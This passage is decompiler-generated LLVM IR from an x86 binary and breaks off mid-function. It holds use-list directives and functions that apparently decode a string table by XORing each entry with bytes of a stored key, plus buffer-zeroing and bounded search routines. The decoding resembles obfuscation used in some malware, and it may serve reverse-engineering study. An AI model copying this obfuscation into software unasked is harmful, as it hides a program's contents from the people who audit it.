  uselistorder i32 %v1_804e2c2, { 1, 0 }
  uselistorder i32 %v3_804e2bf, { 1, 0, 2 }
  uselistorder i32 %v2_804e2bd, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_804e2a2, { 1, 0 }
  uselistorder i32 %v0_804e2a2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e28d, { 1, 0 }
  uselistorder i32 %v3_804e28a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e327, { 1, 0 }
  uselistorder i32 %v1_804e324, { 2, 1, 0 }
  uselistorder i32 %v1_804e228, { 1, 0 }
  uselistorder i32 %v1_804e21d, { 1, 0 }
  uselistorder i32 %v0_804e21d, { 1, 0 }
  uselistorder i32 %v0_804e226, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e1fa, { 1, 0 }
  uselistorder i32 %v0_804e1fa, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_804e1ec, { 1, 0, 2 }
  uselistorder i32 %v4_804e1af, { 2, 1, 0 }
  uselistorder i32 %v3_804e17e, { 1, 0, 2 }
  uselistorder i32 %v0_804e0c2, { 0, 2, 1 }
  uselistorder i32 %v0_804e0b9, { 0, 3, 1, 2 }
  uselistorder i8 %v1_804e091, { 1, 0 }
  uselistorder i32 %v0_804e09a, { 1, 0 }
  uselistorder i8 %v1_804e06c, { 1, 0 }
  uselistorder i8 %v2_804e046, { 1, 5, 6, 0, 3, 4, 2 }
  uselistorder i32 %v2_804e03d, { 10, 4, 9, 6, 1, 0, 2, 3, 7, 5, 8 }
  uselistorder i32 %v5_804e03b, { 0, 5, 4, 7, 6, 2, 3, 1 }
  uselistorder i32 %v1_804e035, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804e030, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804dfe4, { 1, 0 }
  uselistorder i32 %v0_804df34, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804df2f, { 1, 0 }
  uselistorder i32 %v1_804df0c, { 2, 1, 0 }
  uselistorder i32 %v0_804def4, { 3, 5, 2, 4, 0, 1 }
  uselistorder i32 %v0_804de1f, { 2, 0, 1 }
  uselistorder i32 %v0_804dde3, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 27, 6, 34, 3, 17, 7, 8, 9, 64, 65, 66, 25, 15, 19, 20, 21, 22, 23, 35, 36, 28, 50, 0, 1, 2, 54, 4, 53, 30, 31, 29, 10, 11, 12, 13, 14, 56, 16, 55, 18, 57, 24, 51, 26, 52, 32, 33, 58, 59, 60, 61, 62, 63, 37, 38, 41, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %ecx.global-to-local, { 13, 14, 15, 16, 17, 1, 5, 6, 35, 8, 9, 4, 7, 18, 0, 10, 2, 3, 11, 12, 34, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %eax.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 118, 119, 120, 121, 122, 35, 138, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 209, 220, 221, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 9, 10, 11, 12, 13, 14, 15, 87, 88, 89, 90, 91, 92, 96, 48, 50, 49, 51, 52, 53, 54, 55, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 110, 111, 112, 113, 114, 115, 78, 79, 80, 81, 82, 83, 84, 97, 98, 99, 100, 101, 95, 102, 103, 104, 105, 106, 107, 149, 150, 151, 217, 123, 124, 125, 152, 153, 154, 155, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 126, 127, 128, 129, 130, 57, 58, 59, 60, 61, 62, 56, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 85, 86, 93, 94, 108, 109, 116, 117, 131, 132, 133, 134, 135, 136, 137, 210, 211, 212, 213, 214, 215, 216, 218, 0, 219, 156, 157, 158, 159, 207, 208, 160, 161, 162, 163, 164, 165, 166, 168, 169, 170, 171, 172, 176, 178, 177, 173, 174, 175, 167, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 46, 204, 206, 205, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203 }
  uselistorder i32 1848, { 1, 0, 2 }
  uselistorder i32 ()* @function_804f870, { 4, 1, 0, 2, 3 }
  uselistorder i32 1864, { 0, 4, 5, 12, 10, 15, 1, 2, 6, 7, 14, 3, 16, 8, 9, 13, 11 }
  uselistorder i32 ()* @function_804f0e0, { 13, 5, 4, 14, 8, 6, 12, 3, 2, 1, 0, 9, 7, 15, 11, 10 }
  uselistorder i32 ()* @function_804f0b0, { 8, 9, 3, 7, 0, 1, 4, 2, 10, 6, 5 }
  uselistorder i32 1872, { 5, 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @function_804f160, { 8, 9, 3, 7, 1, 0, 4, 2, 10, 6, 5 }
  uselistorder i8 58, { 8, 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_8050441, { 19, 18, 17, 16, 15, 14, 13, 4, 3, 21, 20, 8, 7, 1, 0, 10, 9, 6, 5, 23, 22, 12, 11, 2 }
  uselistorder i8 -5, { 2, 3, 0, 1 }
  uselistorder i8 -3, { 4, 5, 6, 3, 0, 1, 2 }
  uselistorder i32 1556, { 1, 0, 2 }
  uselistorder i32 1684, { 1, 0, 2 }
  uselistorder i32 ()* @function_804d8f0, { 3, 2, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0, 2 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i8 31, { 1, 2, 3, 0 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 10, { 1, 2, 3, 0 }
  uselistorder i8 127, { 1, 0 }
  uselistorder i32 ()* @function_804d6c0, { 2, 1, 0 }
  uselistorder i16* @global_var_8053116.13, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 2, 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1852, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ef6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef5a, { 1, 0 }
  uselistorder label %dec_label_pc_804e425.backedge, { 22, 6, 13, 8, 16, 11, 2, 15, 1, 4, 17, 5, 19, 7, 9, 20, 10, 18, 12, 21, 14, 0, 3 }
  uselistorder label %dec_label_pc_804ee78, { 1, 0 }
  uselistorder label %dec_label_pc_804ebdd, { 1, 0 }
  uselistorder label %dec_label_pc_804eb27, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ea99, { 1, 5, 2, 8, 4, 6, 0, 3, 7 }
  uselistorder label %dec_label_pc_804ea57, { 1, 0 }
  uselistorder label %dec_label_pc_804e9f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e8df, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e842, { 1, 0 }
  uselistorder label %dec_label_pc_804e836, { 1, 0 }
  uselistorder label %dec_label_pc_804e836.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804e812, { 1, 0 }
  uselistorder label %dec_label_pc_804e7bf, { 1, 0 }
  uselistorder label %dec_label_pc_804e793, { 1, 0 }
  uselistorder label %dec_label_pc_804e788, { 3, 2, 7, 4, 10, 6, 0, 8, 1, 11, 5, 9 }
  uselistorder label %dec_label_pc_804e69a, { 1, 0 }
  uselistorder label %dec_label_pc_804e68e, { 1, 0 }
  uselistorder label %dec_label_pc_804e68e.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804e66a, { 1, 0 }
  uselistorder label %dec_label_pc_804e611, { 1, 0 }
  uselistorder label %dec_label_pc_804e5cc, { 1, 0 }
  uselistorder label %dec_label_pc_804e58c, { 1, 0 }
  uselistorder label %dec_label_pc_804e546, { 1, 0 }
  uselistorder label %dec_label_pc_804e526, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804e505, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e4f2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e4e0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804e4b4, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e487, { 1, 0 }
  uselistorder label %dec_label_pc_804e482, { 1, 0 }
  uselistorder label %dec_label_pc_804e440, { 1, 0 }
  uselistorder label %dec_label_pc_804e42c, { 1, 0 }
  uselistorder label %dec_label_pc_804e40e, { 1, 0 }
  uselistorder label %dec_label_pc_804e3c2, { 5, 0, 6, 7, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_804e39a, { 1, 0 }
  uselistorder label %dec_label_pc_804e2c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e293, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder label %dec_label_pc_804e246, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e21d, { 1, 0 }
  uselistorder label %dec_label_pc_804e136, { 9, 1, 2, 3, 4, 5, 0, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804e12b, { 1, 0 }
  uselistorder label %dec_label_pc_804e0cb, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e0b0, { 1, 0 }
  uselistorder label %dec_label_pc_804e07a, { 1, 0 }
  uselistorder label %dec_label_pc_804e030, { 6, 7, 0, 1, 2, 5, 4, 3, 8 }
  uselistorder label %dec_label_pc_804e030.preheader, { 21, 17, 20, 16, 19, 15, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18 }
  uselistorder label %dec_label_pc_804de7e, { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_804de31, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804de1f, { 1, 2, 0 }
}

define i32 @function_804f0b0() local_unnamed_addr {
dec_label_pc_804f0b0:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_804f0b8 = icmp eq i32 %tmp, 0
  %v1_804f0ba = mul i32 %tmp2, 8
  store i32 %v1_804f0ba, i32* %edx.global-to-local, align 4
  br i1 %v1_804f0b8, label %dec_label_pc_804f0d3, label %dec_label_pc_804f0c9

dec_label_pc_804f0c9:                             ; preds = %dec_label_pc_804f0b0
  %v1_804f0c9 = add i32 %v1_804f0ba, add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4)
  %v2_804f0c9 = inttoptr i32 %v1_804f0c9 to i32*
  %v3_804f0c9 = load i32, i32* %v2_804f0c9, align 4
  %v1_804f0cc = urem i32 %v3_804f0c9, 65536
  %v2_804f0d1 = inttoptr i32 %tmp to i32*
  store i32 %v1_804f0cc, i32* %v2_804f0d1, align 4
  %v0_804f0d3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f0d3

dec_label_pc_804f0d3:                             ; preds = %dec_label_pc_804f0b0, %dec_label_pc_804f0c9
  %v0_804f0d3 = phi i32 [ %v1_804f0ba, %dec_label_pc_804f0b0 ], [ %v0_804f0d3.pre, %dec_label_pc_804f0c9 ]
  %v1_804f0d3 = add i32 %v0_804f0d3, ptrtoint (i32* @global_var_80531a0.27 to i32)
  %v2_804f0d3 = inttoptr i32 %v1_804f0d3 to i32*
  %v3_804f0d3 = load i32, i32* %v2_804f0d3, align 4
  ret i32 %v3_804f0d3

; uselistorder directives
  uselistorder label %dec_label_pc_804f0d3, { 1, 0 }
}

define i32 @function_804f0e0() local_unnamed_addr {
dec_label_pc_804f0e0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f0e9 = zext i8 %tmp to i32
  %v1_804f0ed = mul nuw nsw i32 %v4_804f0e9, 8
  %v2_804f0ed = add i32 %v1_804f0ed, ptrtoint (i32* @global_var_80531a0.27 to i32)
  store i32 %v2_804f0ed, i32* %ecx.global-to-local, align 4
  %v0_804f0f4 = load i16, i16* @global_var_8053038.28, align 2
  %v1_804f0f4 = sext i16 %v0_804f0f4 to i32
  %v1_804f0f9 = add i32 %v1_804f0ed, add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4)
  %v2_804f0f9 = inttoptr i32 %v1_804f0f9 to i16*
  %v3_804f0f9 = load i16, i16* %v2_804f0f9, align 4
  %v4_804f0f9 = icmp eq i16 %v3_804f0f9, 0
  br i1 %v4_804f0f9, label %dec_label_pc_804f14a, label %dec_label_pc_804f100

dec_label_pc_804f100:                             ; preds = %dec_label_pc_804f0e0
  store i32 %v1_804f0f4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804f108 = udiv i32 %v1_804f0f4, 16777216
  %v2_804f10b = udiv i32 %v1_804f0f4, 256
  store i32 %v2_804f10b, i32* %edi.global-to-local, align 4
  %v5_804f10e = trunc i32 %v2_804f108 to i8
  store i8 %v5_804f10e, i8* %stack_var_-44, align 1
  %v2_804f111 = udiv i32 %v1_804f0f4, 65536
  store i32 %v2_804f111, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f114

dec_label_pc_804f114:                             ; preds = %dec_label_pc_804f114.dec_label_pc_804f114_crit_edge, %dec_label_pc_804f100
  %v0_804f11a = phi i32 [ %v0_804f11a.pre, %dec_label_pc_804f114.dec_label_pc_804f114_crit_edge ], [ %v1_804f0f4, %dec_label_pc_804f100 ]
  %v0_804f116 = phi i32 [ %v1_804f146, %dec_label_pc_804f114.dec_label_pc_804f114_crit_edge ], [ 0, %dec_label_pc_804f100 ]
  %v0_804f114 = phi i32 [ %v0_804f13e, %dec_label_pc_804f114.dec_label_pc_804f114_crit_edge ], [ %v2_804f0ed, %dec_label_pc_804f100 ]
  %v1_804f114 = inttoptr i32 %v0_804f114 to i32*
  %v2_804f114 = load i32, i32* %v1_804f114, align 4
  %v2_804f118 = add i32 %v2_804f114, %v0_804f116
  %v1_804f11c = inttoptr i32 %v2_804f118 to i8*
  %v2_804f11c = load i8, i8* %v1_804f11c, align 1
  %v4_804f11c = trunc i32 %v0_804f11a to i8
  %v5_804f11c = xor i8 %v2_804f11c, %v4_804f11c
  store i8 %v5_804f11c, i8* %v1_804f11c, align 1
  %v0_804f11e = load i32, i32* %edx.global-to-local, align 4
  %v0_804f120 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f120 = inttoptr i32 %v0_804f120 to i32*
  %v2_804f120 = load i32, i32* %v1_804f120, align 4
  %v2_804f122 = add i32 %v2_804f120, %v0_804f11e
  %v0_804f124 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f126 = inttoptr i32 %v2_804f122 to i8*
  %v2_804f126 = load i8, i8* %v1_804f126, align 1
  %v4_804f126 = trunc i32 %v0_804f124 to i8
  %v5_804f126 = xor i8 %v2_804f126, %v4_804f126
  store i8 %v5_804f126, i8* %v1_804f126, align 1
  %v0_804f128 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f12a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f12a = inttoptr i32 %v0_804f12a to i32*
  %v2_804f12a = load i32, i32* %v1_804f12a, align 4
  %v2_804f12c = add i32 %v2_804f12a, %v0_804f128
  %v0_804f12e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f130 = inttoptr i32 %v2_804f12c to i8*
  %v2_804f130 = load i8, i8* %v1_804f130, align 1
  %v4_804f130 = trunc i32 %v0_804f12e to i8
  %v5_804f130 = xor i8 %v2_804f130, %v4_804f130
  store i8 %v5_804f130, i8* %v1_804f130, align 1
  %v0_804f132 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f134 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f134 = inttoptr i32 %v0_804f134 to i32*
  %v2_804f134 = load i32, i32* %v1_804f134, align 4
  %v1_804f136 = add i32 %v0_804f132, 1
  store i32 %v1_804f136, i32* %edx.global-to-local, align 4
  %v2_804f137 = add i32 %v2_804f134, %v0_804f132
  %v2_804f139 = load i8, i8* %stack_var_-44, align 1
  %v1_804f13c = inttoptr i32 %v2_804f137 to i8*
  %v2_804f13c = load i8, i8* %v1_804f13c, align 1
  %v5_804f13c = xor i8 %v2_804f13c, %v2_804f139
  store i8 %v5_804f13c, i8* %v1_804f13c, align 1
  %v0_804f13e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f13e = add i32 %v0_804f13e, 4
  %v2_804f13e = inttoptr i32 %v1_804f13e to i32*
  %v3_804f13e = load i32, i32* %v2_804f13e, align 4
  %v1_804f141 = urem i32 %v3_804f13e, 65536
  %v1_804f146 = load i32, i32* %edx.global-to-local, align 4
  %v8_804f148 = icmp sgt i32 %v1_804f141, %v1_804f146
  br i1 %v8_804f148, label %dec_label_pc_804f114.dec_label_pc_804f114_crit_edge, label %dec_label_pc_804f14a

dec_label_pc_804f114.dec_label_pc_804f114_crit_edge: ; preds = %dec_label_pc_804f114
  %v0_804f11a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f114

dec_label_pc_804f14a:                             ; preds = %dec_label_pc_804f114, %dec_label_pc_804f0e0
  %v0_804f151 = phi i32 [ %v1_804f0f4, %dec_label_pc_804f0e0 ], [ %v1_804f141, %dec_label_pc_804f114 ]
  ret i32 %v0_804f151

; uselistorder directives
  uselistorder i32 %v1_804f146, { 1, 0 }
  uselistorder i32 %v1_804f141, { 1, 0 }
  uselistorder i32 %v0_804f13e, { 1, 0 }
  uselistorder i32 %v1_804f0f4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_804f160() local_unnamed_addr {
dec_label_pc_804f160:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f169 = zext i8 %tmp to i32
  %v1_804f16d = mul nuw nsw i32 %v4_804f169, 8
  %v2_804f16d = add i32 %v1_804f16d, ptrtoint (i32* @global_var_80531a0.27 to i32)
  store i32 %v2_804f16d, i32* %ecx.global-to-local, align 4
  %v0_804f174 = load i16, i16* @global_var_8053038.28, align 2
  %v1_804f174 = sext i16 %v0_804f174 to i32
  %v1_804f179 = add i32 %v1_804f16d, add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4)
  %v2_804f179 = inttoptr i32 %v1_804f179 to i16*
  %v3_804f179 = load i16, i16* %v2_804f179, align 4
  %v4_804f179 = icmp eq i16 %v3_804f179, 0
  br i1 %v4_804f179, label %dec_label_pc_804f1ca, label %dec_label_pc_804f180

dec_label_pc_804f180:                             ; preds = %dec_label_pc_804f160
  store i32 %v1_804f174, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_804f188 = udiv i32 %v1_804f174, 16777216
  %v2_804f18b = udiv i32 %v1_804f174, 256
  store i32 %v2_804f18b, i32* %edi.global-to-local, align 4
  %v5_804f18e = trunc i32 %v2_804f188 to i8
  store i8 %v5_804f18e, i8* %stack_var_-44, align 1
  %v2_804f191 = udiv i32 %v1_804f174, 65536
  store i32 %v2_804f191, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f194

dec_label_pc_804f194:                             ; preds = %dec_label_pc_804f194.dec_label_pc_804f194_crit_edge, %dec_label_pc_804f180
  %v0_804f19a = phi i32 [ %v0_804f19a.pre, %dec_label_pc_804f194.dec_label_pc_804f194_crit_edge ], [ %v1_804f174, %dec_label_pc_804f180 ]
  %v0_804f196 = phi i32 [ %v1_804f1c6, %dec_label_pc_804f194.dec_label_pc_804f194_crit_edge ], [ 0, %dec_label_pc_804f180 ]
  %v0_804f194 = phi i32 [ %v0_804f1be, %dec_label_pc_804f194.dec_label_pc_804f194_crit_edge ], [ %v2_804f16d, %dec_label_pc_804f180 ]
  %v1_804f194 = inttoptr i32 %v0_804f194 to i32*
  %v2_804f194 = load i32, i32* %v1_804f194, align 4
  %v2_804f198 = add i32 %v2_804f194, %v0_804f196
  %v1_804f19c = inttoptr i32 %v2_804f198 to i8*
  %v2_804f19c = load i8, i8* %v1_804f19c, align 1
  %v4_804f19c = trunc i32 %v0_804f19a to i8
  %v5_804f19c = xor i8 %v2_804f19c, %v4_804f19c
  store i8 %v5_804f19c, i8* %v1_804f19c, align 1
  %v0_804f19e = load i32, i32* @edx, align 4
  %v0_804f1a0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f1a0 = inttoptr i32 %v0_804f1a0 to i32*
  %v2_804f1a0 = load i32, i32* %v1_804f1a0, align 4
  %v2_804f1a2 = add i32 %v2_804f1a0, %v0_804f19e
  %v0_804f1a4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f1a6 = inttoptr i32 %v2_804f1a2 to i8*
  %v2_804f1a6 = load i8, i8* %v1_804f1a6, align 1
  %v4_804f1a6 = trunc i32 %v0_804f1a4 to i8
  %v5_804f1a6 = xor i8 %v2_804f1a6, %v4_804f1a6
  store i8 %v5_804f1a6, i8* %v1_804f1a6, align 1
  %v0_804f1a8 = load i32, i32* @edx, align 4
  %v0_804f1aa = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f1aa = inttoptr i32 %v0_804f1aa to i32*
  %v2_804f1aa = load i32, i32* %v1_804f1aa, align 4
  %v2_804f1ac = add i32 %v2_804f1aa, %v0_804f1a8
  %v0_804f1ae = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1b0 = inttoptr i32 %v2_804f1ac to i8*
  %v2_804f1b0 = load i8, i8* %v1_804f1b0, align 1
  %v4_804f1b0 = trunc i32 %v0_804f1ae to i8
  %v5_804f1b0 = xor i8 %v2_804f1b0, %v4_804f1b0
  store i8 %v5_804f1b0, i8* %v1_804f1b0, align 1
  %v0_804f1b2 = load i32, i32* @edx, align 4
  %v0_804f1b4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f1b4 = inttoptr i32 %v0_804f1b4 to i32*
  %v2_804f1b4 = load i32, i32* %v1_804f1b4, align 4
  %v1_804f1b6 = add i32 %v0_804f1b2, 1
  store i32 %v1_804f1b6, i32* @edx, align 4
  %v2_804f1b7 = add i32 %v2_804f1b4, %v0_804f1b2
  %v2_804f1b9 = load i8, i8* %stack_var_-44, align 1
  %v1_804f1bc = inttoptr i32 %v2_804f1b7 to i8*
  %v2_804f1bc = load i8, i8* %v1_804f1bc, align 1
  %v5_804f1bc = xor i8 %v2_804f1bc, %v2_804f1b9
  store i8 %v5_804f1bc, i8* %v1_804f1bc, align 1
  %v0_804f1be = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f1be = add i32 %v0_804f1be, 4
  %v2_804f1be = inttoptr i32 %v1_804f1be to i32*
  %v3_804f1be = load i32, i32* %v2_804f1be, align 4
  %v1_804f1c1 = urem i32 %v3_804f1be, 65536
  %v1_804f1c6 = load i32, i32* @edx, align 4
  %v8_804f1c8 = icmp sgt i32 %v1_804f1c1, %v1_804f1c6
  br i1 %v8_804f1c8, label %dec_label_pc_804f194.dec_label_pc_804f194_crit_edge, label %dec_label_pc_804f1ca

dec_label_pc_804f194.dec_label_pc_804f194_crit_edge: ; preds = %dec_label_pc_804f194
  %v0_804f19a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f194

dec_label_pc_804f1ca:                             ; preds = %dec_label_pc_804f194, %dec_label_pc_804f160
  %v0_804f1d1 = phi i32 [ %v1_804f174, %dec_label_pc_804f160 ], [ %v1_804f1c1, %dec_label_pc_804f194 ]
  ret i32 %v0_804f1d1

; uselistorder directives
  uselistorder i32 %v1_804f1c6, { 1, 0 }
  uselistorder i32 %v1_804f1c1, { 1, 0 }
  uselistorder i32 %v0_804f1be, { 1, 0 }
  uselistorder i32 %v1_804f174, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_8053038.28, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80531a0.27 to i32), { 1, 2, 3, 0 }
}

define i32 @function_804f850(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f850:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f858 = icmp eq i32 %arg2, 0
  br i1 %v1_804f858, label %dec_label_pc_804f850.dec_label_pc_804f869_crit_edge, label %dec_label_pc_804f85c

dec_label_pc_804f850.dec_label_pc_804f869_crit_edge: ; preds = %dec_label_pc_804f850
  %v0_804f869.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f869

dec_label_pc_804f85c:                             ; preds = %dec_label_pc_804f850
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804f8605 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_804f8605, align 1
  %v0_804f8646 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f8647 = add i32 %v0_804f8646, 1
  store i32 %v1_804f8647, i32* %eax.global-to-local, align 4
  %v12_804f8658 = icmp eq i32 %v1_804f8647, %arg2
  %v1_804f8679 = icmp eq i1 %v12_804f8658, false
  br i1 %v1_804f8679, label %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge, label %dec_label_pc_804f869

dec_label_pc_804f860.dec_label_pc_804f860_crit_edge: ; preds = %dec_label_pc_804f85c, %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge
  %v1_804f86410 = phi i32 [ %v1_804f864, %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge ], [ %v1_804f8647, %dec_label_pc_804f85c ]
  %v1_804f860.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f860 = add i32 %v1_804f86410, %v1_804f860.pre
  %v3_804f860 = inttoptr i32 %v2_804f860 to i8*
  store i8 0, i8* %v3_804f860, align 1
  %v0_804f864 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f864 = add i32 %v0_804f864, 1
  store i32 %v1_804f864, i32* %eax.global-to-local, align 4
  %v12_804f865 = icmp eq i32 %v1_804f864, %arg2
  %v1_804f867 = icmp eq i1 %v12_804f865, false
  br i1 %v1_804f867, label %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge, label %dec_label_pc_804f869

dec_label_pc_804f869:                             ; preds = %dec_label_pc_804f85c, %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge, %dec_label_pc_804f850.dec_label_pc_804f869_crit_edge
  %v0_804f869 = phi i32 [ %v0_804f869.pre, %dec_label_pc_804f850.dec_label_pc_804f869_crit_edge ], [ %v1_804f8647, %dec_label_pc_804f85c ], [ %v1_804f864, %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge ]
  ret i32 %v0_804f869

; uselistorder directives
  uselistorder i32 %v1_804f864, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f869, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f860.dec_label_pc_804f860_crit_edge, { 1, 0 }
}

define i32 @function_804f870() local_unnamed_addr {
dec_label_pc_804f870:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_804f885 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_804f885, %tmp17
  br i1 %or.cond, label %dec_label_pc_804f88a, label %dec_label_pc_804f894

dec_label_pc_804f88a:                             ; preds = %dec_label_pc_804f8a2, %dec_label_pc_804f8b5, %dec_label_pc_804f870
  %storemerge = phi i32 [ -1, %dec_label_pc_804f870 ], [ -1, %dec_label_pc_804f8a2 ], [ %v0_804f8a3, %dec_label_pc_804f8b5 ]
  ret i32 %storemerge

dec_label_pc_804f894:                             ; preds = %dec_label_pc_804f870
  %v2_804f8ac = add i32 %tmp, -1
  br label %dec_label_pc_804f8a8

dec_label_pc_804f8a0:                             ; preds = %dec_label_pc_804f8a8
  br label %dec_label_pc_804f8a2

dec_label_pc_804f8a2:                             ; preds = %dec_label_pc_804f8b5, %dec_label_pc_804f8a0
  %v2_804f8b03 = phi i32 [ %v1_804f8b5, %dec_label_pc_804f8b5 ], [ 0, %dec_label_pc_804f8a0 ]
  %v1_804f8a2 = add i32 %v0_804f8a2, 1
  %v1_804f8a3 = add i32 %v0_804f8a3, 1
  %v12_804f8a4 = icmp eq i32 %tmp10, %v1_804f8a2
  br i1 %v12_804f8a4, label %dec_label_pc_804f88a, label %dec_label_pc_804f8a8

dec_label_pc_804f8a8:                             ; preds = %dec_label_pc_804f8a2, %dec_label_pc_804f894
  %v0_804f8a2 = phi i32 [ %v1_804f8a2, %dec_label_pc_804f8a2 ], [ 0, %dec_label_pc_804f894 ]
